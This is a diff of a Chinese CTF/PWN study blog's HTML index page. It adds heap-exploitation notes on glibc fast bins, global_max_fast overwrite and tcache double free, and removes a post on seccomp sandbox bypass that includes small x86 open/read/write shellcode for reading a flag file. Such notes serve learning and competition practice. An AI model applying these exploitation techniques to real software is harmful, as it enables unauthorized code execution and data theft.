+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://example.com/2025/04/26/%E5%B0%86%E7%94%B1%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%BC%BA%E5%88%B6%E8%BD%AC%E6%8D%A2%E6%88%90%E7%9A%8412-16%E5%AD%97%E8%8A%82%E6%95%B0%E6%8D%AE%E8%BD%AC%E6%8D%A2%E4%B8%BA8%E5%AD%97%E8%8A%82%E6%95%B0%E6%8D%AE/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -264,7 +399,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2025-04-24 18:54:06" itemprop="dateModified" datetime="2025-04-24T18:54:06+08:00">2025-04-24</time>
+                <time title="修改时间：2025-04-27 22:13:00" itemprop="dateModified" datetime="2025-04-27T22:13:00+08:00">2025-04-27</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -293,6 +428,7 @@
       
           <h1 id="bins"><a href="#bins" class="headerlink" title="bins"></a>bins</h1><p><img src="/../images/heap/0.png" alt="0"></p>
 <h1 id="global-max-fast"><a href="#global-max-fast" class="headerlink" title="global_max_fast"></a>global_max_fast</h1><p><strong>glibc（GNU C Library）中动态内存分配器（ptmalloc2）</strong> 的一个关键全局变量，用于控制 <strong>fast bins（快速分配区）</strong> 的最大内存块大小。</p>
+<p>可以通过漏洞修改其大小来达到特殊的效果</p>
 <h1 id="fast-bin"><a href="#fast-bin" class="headerlink" title="fast bin"></a>fast bin</h1><p>单向链表</p>
 <p>32位下fast bin范围为16到64</p>
 <p>64位下fast bin范围为32到128</p>
@@ -314,9 +450,11 @@
 <li><p>通过上面的泄露unsorted_bin的fd指针</p>
 </li>
 <li><p>通过__malloc_trim函数直接获得</p>
-<p> <strong>“比如把 <code>.so</code> 文件放到 IDA 中，找到 <code>malloc_trim</code> 函数，就可以获得偏移了。”</strong> -–ctfwiki</p>
+</li>
+<li><p><img src="/../images/heap/1.png" alt="1"></p>
 </li>
 </ol>
+<p>  <strong>“比如把 <code>.so</code> 文件放到 IDA 中，找到 <code>malloc_trim</code> 函数，就可以获得偏移了。”</strong> -–ctfwiki</p>
 <h1 id="tcache"><a href="#tcache" class="headerlink" title="tcache"></a>tcache</h1><p><em>glibc 2.26后</em></p>
 <p><strong>两个结构体</strong></p>
 <h2 id="tcache-dup"><a href="#tcache-dup" class="headerlink" title="tcache dup"></a>tcache dup</h2><p>仅限glibc2.26,可以直接对其进行double free</p>
@@ -1109,96 +1247,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2025/03/18/%E5%88%9D%E6%8E%A2sandbox(C%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8)%E4%B9%8Borw/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/uploads/avatar.png">
-      <meta itemprop="name" content="Sn0r1ax">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Welcome!">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2025/03/18/%E5%88%9D%E6%8E%A2sandbox(C%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8)%E4%B9%8Borw/" class="post-title-link" itemprop="url">初探sandbox(C沙盒逃逸)</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2025-03-18 19:58:46" itemprop="dateCreated datePublished" datetime="2025-03-18T19:58:46+08:00">2025-03-18</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2025-03-20 15:13:00" itemprop="dateModified" datetime="2025-03-20T15:13:00+08:00">2025-03-20</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/PWN/" itemprop="url" rel="index"><span itemprop="name">PWN</span></a>
-                </span>
-                  ，
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">笔记</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="何为沙箱"><a href="#何为沙箱" class="headerlink" title="何为沙箱"></a>何为沙箱</h1><p>沙箱即限制程序只能调用指定函数来保证程序的安全性</p>
-<h1 id="何为orw"><a href="#何为orw" class="headerlink" title="何为orw"></a>何为orw</h1><p>orw即open,read,write函数的缩写,一般情况下程序会限制只能调用这三个函数的其中几种</p>
-<p>那么由于程序只允许我们调用这三个函数,那么我们无法通过系统调用execve来getshell,只能通过orw这三个函数来获取关键信息(即flag)</p>
-<h1 id="如何判断"><a href="#如何判断" class="headerlink" title="如何判断"></a>如何判断</h1><p>可以通过seccomp-tools来判断是否开启沙箱</p>
-<p><code>seccomp-tools dump ./pwn</code></p>
-<p><img src="/../images/orw/0.png" alt="0"></p>
-<h1 id="如何绕过"><a href="#如何绕过" class="headerlink" title="如何绕过"></a>如何绕过</h1><h2 id="shellcode绕过"><a href="#shellcode绕过" class="headerlink" title="shellcode绕过"></a>shellcode绕过</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>通过向栈上注入orw的代码让程序执行(需要关闭nx保护)</p>
-<p>例如:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#fd = open(&#x27;/home/orw/flag&#x27;,0) </span><br><span class="line">s = &#x27;&#x27;&#x27; xor edx,edx; mov ecx,0; mov ebx,0x804a094; mov eax,5; int 0x80; &#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">#read(fd,0x804a094,0x20) </span><br><span class="line">s = &#x27;&#x27;&#x27; mov edx,0x40; mov ecx,ebx; mov ebx,eax; mov eax,3; int 0x80; &#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">#write(1,0x804a094,0x20) </span><br><span class="line">s = &#x27;&#x27;&#x27; mov edx,0x40; mov ebx,1; mov eax,4 int 0x80; &#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure>
-
-<h2 id="ROP绕过"><a href="#ROP绕过" class="headerlink" title="ROP绕过"></a>ROP绕过</h2><p>适用于开启了nx保护的情况</p>
-<h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>通过栈迁移等方法向.bss段写入代码然后构造ROP链到bss段执行相关代码</p>
-<p><a target="_blank" rel="noopener" href="https://x1ng.top/2021/10/28/pwn-orw%E6%80%BB%E7%BB%93/">参考文章</a></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1270,7 +1318,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">14</span>
+          <span class="site-state-item-count">15</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
